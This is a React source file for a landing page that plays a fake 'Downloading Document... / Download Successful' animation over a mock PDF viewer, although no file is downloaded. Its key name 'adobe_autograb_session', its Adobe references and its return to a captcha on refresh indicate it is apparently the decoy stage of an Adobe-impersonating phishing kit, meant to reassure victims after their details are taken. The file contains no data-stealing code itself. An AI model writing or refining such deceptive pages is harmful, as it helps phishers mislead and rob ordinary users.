import React, { useEffect, useRef, useState } from 'react';

interface LandingPageProps {
  onFileAction?: (fileName: string, action: 'view' | 'download') => void;
}

/**
 * Behavior per request:
 * - Replace Adobe icon with a realistic PDF document "viewer" animation.
 * - Single flow: "Downloading..." -> "Download Successful" -> then hide the text,
 *   leaving the document visible plainly (no success text overlay).
 * - Texts should be clearly seen without high-contrast outlines/strokes.
 * - Only show the flow once per session, then remove 'adobe_autograb_session'.
 */
const LandingPage: React.FC<LandingPageProps> = () => {
  const [showOverlay, setShowOverlay] = useState(false);
  const [phase, setPhase] = useState<'idle' | 'downloading' | 'success'>('idle');
  const [dots, setDots] = useState('');
  const [docAnimating, setDocAnimating] = useState(false);

  const dotIntervalRef = useRef<number | null>(null);
  const successTimeoutRef = useRef<number | null>(null);
  const hideOverlayTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    try {
      const raw = localStorage.getItem('adobe_autograb_session');
      if (!raw) return;

      let session: any = null;
      try {
        session = JSON.parse(raw);
      } catch {
        session = null;
      }

      const sessionId = (session && (session.sessionId || session.timestamp)) ? String(session.sessionId || session.timestamp) : null;
      if (!sessionId) return;

      const shownKey = `adobe_download_shown::${sessionId}`;
      const alreadyShown = sessionStorage.getItem(shownKey);
      if (alreadyShown) return;

      // Start sequence
      setShowOverlay(true);
      setPhase('downloading');
      setDocAnimating(true);

      let dotCount = 1;
      const maxDots = 6;
      dotIntervalRef.current = window.setInterval(() => {
        dotCount = dotCount >= maxDots ? 1 : dotCount + 1;
        setDots('.'.repeat(dotCount));
      }, 500) as unknown as number;

      successTimeoutRef.current = window.setTimeout(() => {
        if (dotIntervalRef.current) {
          clearInterval(dotIntervalRef.current);
          dotIntervalRef.current = null;
        }
        setPhase('success');
        setDots('');

        try {
          sessionStorage.setItem(shownKey, new Date().toISOString());
        } catch {}

        // Remove persisted session so a full refresh returns to captcha
        try {
          localStorage.removeItem('adobe_autograb_session');
        } catch {}

        // Hide overlay text shortly after showing success, leaving the doc plain.
        hideOverlayTimeoutRef.current = window.setTimeout(() => {
          setShowOverlay(false);
          setPhase('idle');
          setDocAnimating(false); // document remains plain (no motion) after flow
          hideOverlayTimeoutRef.current = null;
        }, 1200) as unknown as number;

        successTimeoutRef.current = null;
      }, 3000) as unknown as number;

    } catch {
      // ignore
    }

  return () => {
      if (dotIntervalRef.current) {
        clearInterval(dotIntervalRef.current);
        dotIntervalRef.current = null;
      }
      if (successTimeoutRef.current) {
        clearTimeout(successTimeoutRef.current);
        successTimeoutRef.current = null;
      }
      if (hideOverlayTimeoutRef.current) {
        clearTimeout(hideOverlayTimeoutRef.current);
        hideOverlayTimeoutRef.current = null;
      }
    };
  }, []);

  return (
    <div
      style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: '#f5f7fa',
        color: '#111'
      }}
    >
      <RealisticPDF animating={docAnimating} />

      {showOverlay && (
        <div
          aria-live="polite"
          role="status"
          style={{
            position: 'fixed',
            inset: 0,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            pointerEvents: 'none',
            zIndex: 9999
          }}
        >
          <div
            style={{
              background: 'rgba(255,255,255,0.95)',
              color: '#1f2937',
              textAlign: 'center',
              fontFamily: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial',
              fontSize: 18,
              fontWeight: 600,
              pointerEvents: 'none',
              padding: '12px 16px',
              borderRadius: 10,
              border: '1px solid rgba(0,0,0,0.06)',
              boxShadow: '0 6px 20px rgba(0,0,0,0.08)'
            }}
          >
            {phase === 'downloading' && <span>Downloading Document{dots}</span>}
            {phase === 'success' && <span>Download Successful</span>}
          </div>
        </div>
      )}
    </div>
  );
};

function RealisticPDF({ animating }: { animating: boolean }) {
  return (
    <div style={{ position: 'relative' }} aria-hidden="true">
      <style>
        {`
          .pdf-viewer {
            width: 340px;
            border-radius: 14px;
            background: #e9eef3;
            box-shadow: 0 16px 40px rgba(0,0,0,0.12);
            border: 1px solid #d8e0e8;
            overflow: hidden;
          }

          .pdf-toolbar {
            height: 44px;
            background: linear-gradient(0deg, #f7fafc, #ffffff);
            border-bottom: 1px solid #e6ebf1;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 10px 0 12px;
          }
          .pdf-toolbar-left {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #374151;
            font-weight: 600;
            font-size: 13px;
          }
          .pdf-toolbar-dots {
            display: inline-flex;
            gap: 6px;
            margin-right: 6px;
          }
          .pdf-toolbar-dots i {
            width: 8px; height: 8px; border-radius: 50%;
          }
          .pdf-toolbar-dots i:nth-child(1) { background: #ef4444; }
          .pdf-toolbar-dots i:nth-child(2) { background: #f59e0b; }
          .pdf-toolbar-dots i:nth-child(3) { background: #10b981; }

          .pdf-badge {
            background: #e53935;
            color: #fff;
            font-weight: 700;
            font-size: 10px;
            padding: 4px 8px;
            border-radius: 999px;
            letter-spacing: 0.6px;
          }

          .pdf-viewport {
            height: 460px;
            background: radial-gradient(120% 50% at 50% 0%, #f8fafc 0%, #eef2f7 60%, #e9eef3 100%);
            display: grid;
            place-items: center;
            padding: 18px 0;
          }

          .pages-track {
            position: relative;
            width: 270px;
            height: 100%;
            perspective: 800px;
          }

          .page-stack {
            position: absolute;
            inset: 0;
            display: grid;
            place-items: center;
          }

          .page {
            position: relative;
            width: 270px;
            height: 382px; /* ~ A4 portrait ratio */
            background: #fff;
            border-radius: 10px;
            box-shadow:
              0 1px 0 rgba(0,0,0,0.05),
              0 6px 16px rgba(0,0,0,0.12);
            border: 1px solid rgba(0,0,0,0.06);
          }

          .page.back {
            transform: translateY(8px) scale(0.995);
            filter: saturate(0.95) brightness(0.995);
          }
          .page.back2 {
            transform: translateY(16px) scale(0.99);
            filter: saturate(0.92) brightness(0.99);
          }

          .curl {
            position: absolute;
            top: 0; right: 0;
            width: 36px; height: 36px;
            background: linear-gradient(135deg, #f3f6fb 0%, #e5ebf2 70%, rgba(0,0,0,0) 71%);
            clip-path: polygon(100% 0, 0 0, 100% 100%);
            border-top-right-radius: 10px;
          }

          /* Page content (typography lines, image block, header bar) */
          .content {
            position: absolute;
            inset: 16px 18px 18px 18px;
          }
          .header-bar {
            height: 18px;
            background: #f7fafc;
            border: 1px solid #eef2f7;
            border-radius: 6px;
            margin-bottom: 14px;
          }
          .title {
            height: 12px;
            width: 74%;
            background: #eef2f7;
            border-radius: 6px;
            margin: 10px 0 12px 0;
          }
          .para {
            height: 8px;
            background: #eef2f7;
            border-radius: 5px;
            margin: 8px 0;
          }
          .para.w1 { width: 96%; }
          .para.w2 { width: 88%; }
          .para.w3 { width: 92%; }
          .para.w4 { width: 80%; }
          .image {
            height: 96px;
            background: linear-gradient(135deg, #e8eef5 0%, #dae4ef 100%);
            border: 1px solid #dbe3ed;
            border-radius: 8px;
            margin: 14px 0 10px 0;
          }
          .caption {
            height: 8px;
            width: 40%;
            background: #eef2f7;
            border-radius: 5px;
            margin-top: 8px;
          }
          .page-num {
            position: absolute;
            bottom: 8px;
            right: 12px;
            height: 8px;
            width: 28px;
            background: #f0f3f8;
            border-radius: 999px;
          }

          /* Subtle lifelike motion while downloading */
          @keyframes floatDoc {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-8px); }
            100% { transform: translateY(0px); }
          }
          .page.front.anim {
            animation: floatDoc 3.2s ease-in-out infinite;
            transform-origin: 50% 100%;
          }

          /* Optional gentle 'turn' glint line on the right edge */
          .turn-glint {
            position: absolute;
            top: 10px;
            right: 0;
            width: 10px;
            height: calc(100% - 20px);
            background: linear-gradient(90deg, rgba(0,0,0,0) 0%, rgba(220,230,240,0.6) 80%, rgba(0,0,0,0) 100%);
            opacity: 0;
          }
          @keyframes glintSweep {
            0% { opacity: 0; transform: translateX(10px); }
            20% { opacity: 0.5; transform: translateX(-2px); }
            100% { opacity: 0; transform: translateX(-12px); }
          }
          .page.front.anim .turn-glint {
            animation: glintSweep 2.8s ease-in-out infinite;
          }

          /* Respect reduced motion */
          @media (prefers-reduced-motion: reduce) {
            .page.front.anim, .page.front.anim .turn-glint { animation: none !important; }
          }
        `}
      </style>

      <div className="pdf-viewer">
        <div className="pdf-toolbar">
          <div className="pdf-toolbar-left">
            <span className="pdf-toolbar-dots" aria-hidden="true">
              <i></i><i></i><i></i>
            </span>
            <span>Document.pdf</span>
          </div>
          <span className="pdf-badge">PDF</span>
        </div>

        <div className="pdf-viewport">
          <div className="pages-track">
            <div className="page-stack">
              <div className="page back2"></div>
              <div className="page back"></div>

              <div className={`page front ${animating ? 'anim' : ''}`}>
                <div className="curl" />
                <div className="turn-glint" />
                <div className="content">
                  <div className="header-bar" />
                  <div className="title" />
                  <div className="para w1" />
                  <div className="para w2" />
                  <div className="para w3" />
                  <div className="image" />
                  <div className="para w1" />
                  <div className="para w3" />
                  <div className="para w4" />
                  <div className="page-num" />
                </div>
              </div>
            </div>
          </div>
        </div>
      </div> 
    </div>
  );
}

export default LandingPage;
